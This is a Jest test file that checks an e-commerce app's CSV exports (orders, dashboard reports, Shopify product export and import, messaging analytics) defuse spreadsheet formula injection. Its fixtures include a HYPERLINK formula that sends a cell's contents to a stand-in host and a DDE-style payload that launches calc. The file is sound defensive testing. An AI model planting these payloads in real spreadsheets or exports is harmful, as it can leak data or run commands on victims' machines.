import { csvLine } from '../../analytics/messaging/messaging-metrics';
import { DashboardService } from '../../dashboard/dashboard.service';
import { OrderService } from '../../order/order.service';
import { buildShopifyCsv, parseShopifyCsv } from '../../product/csv/shopify-csv.format';
import { neutraliseCsvRow, restoreCsvFormulaText } from './csv-formula.util';

/**
 * Every CSV the app hands out, checked for spreadsheet formulas. Buyer names
 * and emails come from Shopify storefronts, typed by shoppers.
 */
const HOSTILE = {
  customer: '=HYPERLINK("https://evil.example/?x="&B3,"Refund")',
  email: '@SUM(1+1)*cmd|\' /C calc\'!A0',
  items: '+1 cmd x1',
  channel: '\t=1+1',
};

function reportRow(fields: Record<string, string>) {
  return {
    orderNumber: 1001, name: '#1001', date: '2026-10-27T10:00:00.000Z', customer: 'Asha Rao', email: 'asha@example.com',
    channel: 'Shopify', items: 'Shirt x1', itemCount: 1, subtotal: '100.00', tax: '18.00', shipping: '0.00',
    discounts: '-5.00', total: '113.00', currency: 'INR', financialStatus: 'PAID', fulfillmentStatus: 'FULFILLED', ...fields,
  };
}

/** The cells of the second line of a json2csv file, unquoted. */
function cells(csv: string): string[] {
  const line = csv.split('\n')[1];
  return [...line.matchAll(/"((?:[^"]|"")*)"|([^,]+)/g)].map((m) => (m[1] ?? m[2]).replace(/""/g, '"'));
}

describe('CSV exports keep shopper text from running as a formula', () => {
  it.each([
    ['Orders › Export (GET /orders/export/csv)', (rows: object[]) => OrderService.prototype.generateCsv.call({}, rows)],
    ['Dashboard and Orders › Download report (GET /dashboard/export/csv)', (rows: object[]) => DashboardService.prototype.generateCsv.call({}, rows)],
  ])('%s', (_name, generate) => {
    const csv = generate([reportRow(HOSTILE)]);
    const row = cells(csv);

    expect(row).toContain(`'${HOSTILE.customer}`);
    expect(row).toContain(`'${HOSTILE.email}`);
    expect(row).toContain(`'${HOSTILE.items}`);
    expect(row).toContain(`'${HOSTILE.channel}`);
    // Amounts stay numbers, negative ones too.
    expect(row).toContain('-5.00');
    expect(row).toContain('113.00');
    expect(csv).not.toMatch(/(^|,)"?[=+@\t]/m);
  });

  it('Products › Export (GET /products/export.csv), and back in through the import', () => {
    const csv = buildShopifyCsv([
      {
        title: '=HYPERLINK("https://evil.example","Sale")',
        bodyHtml: null,
        vendor: '@vendor',
        productType: '-Shirts',
        tags: ['+new'],
        status: 'ACTIVE',
        publishedAt: null,
        options: [],
        variants: [{
          sku: 'SKU-1', barcode: null, price: 100, compareAtPrice: null, cost: -2, inventoryQuantity: 1, trackQuantity: true,
          continueSellingWhenOutOfStock: false, weight: null, weightUnit: null, requiresShipping: true, taxable: true,
          option1: null, option2: null, option3: null,
        }],
        images: [],
      },
    ]);

    expect(csv).toContain(`"'=HYPERLINK(""https://evil.example"",""Sale"")"`);
    expect(csv).toContain(",'@vendor,'-Shirts,'+new,");
    expect(csv).toContain(',-2,');

    const [row] = parseShopifyCsv(csv);
    expect(row).toMatchObject({ Title: '=HYPERLINK("https://evil.example","Sale")', Vendor: '@vendor', Type: '-Shirts', Tags: '+new', 'Cost per item': '-2' });
  });

  it('Analytics › Messaging (agents.csv, daily.csv)', () => {
    expect(csvLine(['=cmd', '@x', 3, -2])).toBe("'=cmd,'@x,3,-2");
  });
});

describe('neutraliseCsvRow and restoreCsvFormulaText', () => {
  it('neutralises text cells only', () => {
    expect(neutraliseCsvRow({ a: '=1', b: 5, c: null, d: 'Asha' })).toEqual({ a: "'=1", b: 5, c: null, d: 'Asha' });
  });

  it('takes the apostrophe off a neutralised cell, and leaves others alone', () => {
    expect(restoreCsvFormulaText("'=1+1")).toBe('=1+1');
    expect(restoreCsvFormulaText("'-2+3")).toBe('-2+3');
    expect(restoreCsvFormulaText("'tis the season")).toBe("'tis the season");
    expect(restoreCsvFormulaText('Asha')).toBe('Asha');
  });
});
